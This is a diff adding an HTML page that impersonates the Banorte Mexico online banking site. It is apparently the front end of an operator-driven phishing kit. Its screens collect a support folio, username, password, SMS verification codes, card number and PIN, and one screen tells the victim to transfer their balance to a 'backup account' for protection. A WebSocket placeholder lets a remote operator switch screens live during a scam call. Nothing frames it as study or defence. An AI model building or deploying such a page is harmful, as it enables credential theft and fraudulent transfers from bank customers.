@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Banorte en Línea</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; background: #f7f7f7; }
+    header, footer { background: #d6001c; color: white; padding: 10px 20px; text-align: center; }
+    .content { display: flex; justify-content: center; align-items: center; height: 80vh; }
+    .card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+    input, button { width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px; border: 1px solid #ccc; }
+    button { background-color: #d6001c; color: white; border: none; cursor: pointer; }
+    footer nav a { color: white; margin: 0 10px; text-decoration: none; font-size: 14px; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Banorte_logo.svg/2560px-Banorte_logo.svg.png" height="30" alt="Banorte"></h1>
+  </header>
+
+  <div class="content">
+    <!-- FOLIO -->
+    <div id="folio" class="card">
+      <h3>Folio de soporte:</h3>
+      <p>Ingrese el folio proporcionado por el ejecutivo.</p>
+      <input type="text" placeholder="Número de folio">
+      <button>Ingresar</button>
+    </div>
+
+    <!-- LOGIN -->
+    <div id="login" class="card hidden">
+      <h3>Inicio de sesión:</h3>
+      <input type="text" placeholder="Usuario">
+      <input type="password" placeholder="Contraseña">
+      <button>Ingresar</button>
+    </div>
+
+    <!-- VERIFICACIÓN -->
+    <div id="codigo" class="card hidden">
+      <h3>Hemos enviado un código de verificación</h3>
+      <p>Ingresa el código recibido (terminación: <b>9494</b>)</p>
+      <input type="text" placeholder="Ingrese el SMS recibido">
+      <button>Continuar</button>
+    </div>
+
+    <!-- PROTEGER SALDO -->
+    <div id="proteger" class="card hidden">
+      <h3>¡Es necesario proteger su saldo!</h3>
+      <p>Para su seguridad, crearemos una cuenta de TOTAL PROTECCIÓN.</p>
+      <p>Saldo sin proteger: <b>$</b></p>
+    </div>
+
+    <!-- CUENTA PROTEGIDA -->
+    <div id="protegido" class="card hidden">
+      <h3>Cuenta SU TOTAL PROTECCIÓN creada exitosamente</h3>
+      <p>Transfiera su saldo a la siguiente cuenta:</p>
+      <p><b>Alias:</b> Cuenta de respaldo</p>
+    </div>
+
+    <!-- PROTECCIÓN ADICIONAL -->
+    <div id="adicional" class="card hidden">
+      <h3>Protección adicional</h3>
+      <p>Ingrese el número de su tarjeta</p>
+      <input type="text" placeholder="Número de tarjeta">
+      <button>Continuar</button>
+    </div>
+
+    <!-- NIP CONFIRMACIÓN -->
+    <div id="nip" class="card hidden">
+      <h3>Ingrese su NIP de confirmación</h3>
+      <p>Para confirmar la cancelación del cargo no reconocido.</p>
+      <input type="password" placeholder="NIP de confirmación">
+      <button>Validar</button>
+    </div>
+
+    <!-- CANCELACIÓN CÓDIGO -->
+    <div id="codigo_cancelacion" class="card hidden">
+      <h3>Cancelación de cargos</h3>
+      <p>Ingresa el SMS que recibiste (terminación: <b>9494</b>)</p>
+      <input type="text" placeholder="Ingrese el SMS recibido">
+      <button>Continuar</button>
+    </div>
+
+    <!-- CANCELACIÓN EXITOSA -->
+    <div id="cancelacion_exitosa" class="card hidden">
+      <h3>Cancelación exitosa</h3>
+      <p>Se ha realizado la cancelación del cargo no reconocido.</p>
+      <p><b>Comercio:</b> <br><b>Monto devuelto:</b> $</p>
+      <p>En un lapso no mayor a 72 hrs, el monto volverá a estar disponible.</p>
+    </div>
+  </div>
+
+  <footer>
+    <nav>
+      <a href="#">Aprende más</a> |
+      <a href="#">Ayuda</a> |
+      <a href="#">Términos y condiciones</a> |
+      <a href="#">Seguridad en línea</a>
+    </nav>
+    <p>© Banorte México 2023. Todos los Derechos Reservados</p>
+  </footer>
+
+  <script>
+    const ws = new WebSocket("ws://localhost:3000"); // Reemplaza con tu WebSocket real
+
+    ws.onmessage = (event) => {
+      const data = event.data;
+      const pantallas = ["folio", "login", "codigo", "proteger", "protegido", "adicional", "nip", "codigo_cancelacion", "cancelacion_exitosa"];
+      pantallas.forEach(id => document.getElementById(id).classList.add("hidden"));
+      const pantallaActual = document.getElementById(data);
+      if (pantallaActual) pantallaActual.classList.remove("hidden");
+    };
+  </script>
+
+</body>
+</html>
